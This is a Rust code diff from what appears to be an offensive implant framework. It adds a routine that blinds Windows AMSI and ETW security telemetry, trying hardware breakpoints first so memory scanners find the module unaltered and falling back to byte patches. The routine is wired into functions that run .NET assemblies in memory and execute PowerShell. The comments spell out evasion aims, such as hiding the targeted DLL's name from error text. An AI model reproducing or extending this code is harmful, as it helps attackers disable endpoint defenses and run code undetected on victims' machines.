@@ -134,6 +134,27 @@ fn wide(text: &str) -> Vec<u16> {
     text.encode_utf16().chain(std::iter::once(0)).collect()
 }
 
+/// Neutralizes the process instrumentation layers managed execution
+/// cares about. Prefers the hardware-breakpoint variant (ABR-T036:
+/// module bytes stay pristine for memory scanners) and falls back to
+/// the legacy byte patch (ABR-T024) when arming fails.
+fn suppress_amsi_etw(notes: &mut Vec<&'static str>) {
+    if crate::evasion::hwbp::ensure_armed().is_ok() {
+        notes.push("amsi=hwbp,etw=hwbp");
+        return;
+    }
+    match crate::evasion::patch::patch_amsi() {
+        Ok(_) => notes.push("amsi=patched"),
+        Err(_) => notes.push("amsi=unavailable"),
+        // The error detail is deliberately dropped from the note:
+        // failure text would name the very DLL we attempted.
+    }
+    match crate::evasion::patch::patch_etw() {
+        Ok(_) => notes.push("etw=patched"),
+        Err(_) => notes.push("etw=unavailable"),
+    }
+}
+
 /// Hosts the CLR, runs `type_name.method_name(argument)` from `data`
 /// (a .NET Framework assembly) in the default AppDomain and returns an
 /// operator-readable one-liner. `patch_first` neutralizes AMSI/ETW for
@@ -158,16 +179,7 @@ pub fn exec_assembly(
     }
     let mut notes: Vec<&'static str> = Vec::new();
     if patch_first {
-        match crate::evasion::patch::patch_amsi() {
-            Ok(_) => notes.push("amsi=patched"),
-            Err(_e) => notes.push("amsi=unavailable"),
-            // The error detail is deliberately dropped from the note:
-            // failure text would name the very DLL we attempted.
-        }
-        match crate::evasion::patch::patch_etw() {
-            Ok(_) => notes.push("etw=patched"),
-            Err(_) => notes.push("etw=unavailable"),
-        }
+        suppress_amsi_etw(&mut notes);
     }
 
     // Random temp name: the disk flash is documented telemetry, but the
@@ -316,14 +328,7 @@ pub fn powershell_run(script: &str, bootstrap: &[u8]) -> Result<Vec<u8>, String>
         return Err("empty bootstrap".into());
     }
     let mut notes: Vec<&'static str> = Vec::new();
-    match crate::evasion::patch::patch_amsi() {
-        Ok(_) => notes.push("amsi=patched"),
-        Err(_) => notes.push("amsi=unavailable"),
-    }
-    match crate::evasion::patch::patch_etw() {
-        Ok(_) => notes.push("etw=patched"),
-        Err(_) => notes.push("etw=unavailable"),
-    }
+    suppress_amsi_etw(&mut notes);
     let boot_tag: u32 = rand::random();
     let boot_path = std::env::temp_dir().join(format!("{boot_tag:08x}-ps.dll"));
     let out_tag: u32 = rand::random();
